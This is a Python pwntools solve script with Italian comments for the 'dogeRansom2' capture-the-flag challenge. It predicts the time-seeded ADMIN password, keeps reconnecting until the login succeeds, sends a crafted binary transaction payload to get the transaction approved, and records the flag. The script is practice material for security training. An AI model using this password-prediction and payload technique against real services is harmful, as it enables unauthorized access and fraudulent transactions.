#! /usr/bin/env python3
# guardando il modo con cui le inizializza, usa admin e poi cose random
# alfanumeriche! # ho trovato come genera la pass ADMIN!
# NIMDA!, 0x68, 0x67,0x66,0x65,0x64,0x63,0x62,0x61, 0x70, 0x6f,0x6e,0x6d,0x6c,0x6b,0x6a,0x69, 0x78, 0x77,0x76,0x75,0x74,0x73,0x72,0x71, 0x46, 0x45,0x44,0x43,0x42,0x41,0x7a,0x79, 0x4e, 0x4d,0x4c,0x4b,0x4a,0x49,0x48,0x47, 0x56, 0x55,0x54,0x53,0x52,0x51,0x50,0x4f, 0x33, 0x32,0x31,0x30,0x59,0x5a,0x58,0x57, 0x5f, 0x2d,0x39,0x38,0x37,0x36,0x35,0x34;



from pwn import remote, process
import subprocess
import time
import struct

tempo = time.time()
conn = remote("dogeransom2.challs.olicyber.it",10806)
# conn = process('dogeRansom2')
tempoFin = time.time()

time.sleep(0.1) # FACCIO COINCIDERE I TEMPI A MANO
admin_key = subprocess.run(['./try'], stdout=subprocess.PIPE).stdout.decode() # codice copiato per creare pass
tempo2Fin = time.time()

print(admin_key, f"ci ho messo {(tempoFin - tempo)} s. ")
print(f"ci ho messo {tempo2Fin - tempoFin} per connettermi")



currentTime = int(time.time())
currentTime = struct.pack('I', currentTime)

# per dettagli su perch'e cos`i guardare doge.py il primo
payload = b'IT70S0501811800000012284030' + (b'\x00' *9)+ (b'\xff'*3+b'\x00') + currentTime + (b'\x00' * 4) + b'\x02'*2 # HO SOLO CAMBIATO 3 FINALE A 2

# PROVO A STABILIRE CONNESSIONE COME ADMIN
conn.recvuntil(": ")
conn.sendline('ADMIN')
conn.recvuntil(": ")
conn.sendline(admin_key)
ans = conn.recvline().strip()
i = 1
while ans == b"Login invalido.":
    print('questa `e la connessione numero', i)
    i += 1
    conn.close()
    tempo = time.time()
    conn = remote("dogeransom2.challs.olicyber.it",10806)
    # conn = process('dogeRansom2')
    tempoFin = time.time()

    time.sleep(0.1)
    admin_key = subprocess.run(['./try'], stdout=subprocess.PIPE).stdout.decode()
    tempo2Fin = time.time()

    print(admin_key, f"ci ho messo {(tempoFin - tempo)} s. ")
    print(f"ci ho messo {tempo2Fin - tempoFin} per connettermi")
    conn.recvuntil(": ")
    conn.sendline('ADMIN')
    conn.sendline(admin_key)
    ans = conn.recvline().strip()


conn.recvuntil('> ')
# creo transazione in elaborazione
conn.sendline('1')
conn.sendline('10')
conn.sendline(payload)
conn.sendline('IT70S0501811800000012284030')

# approvo la transazione
conn.sendline('6')
conn.sendline('Y')
conn.interactive()

# flag{St3nch_PIg}


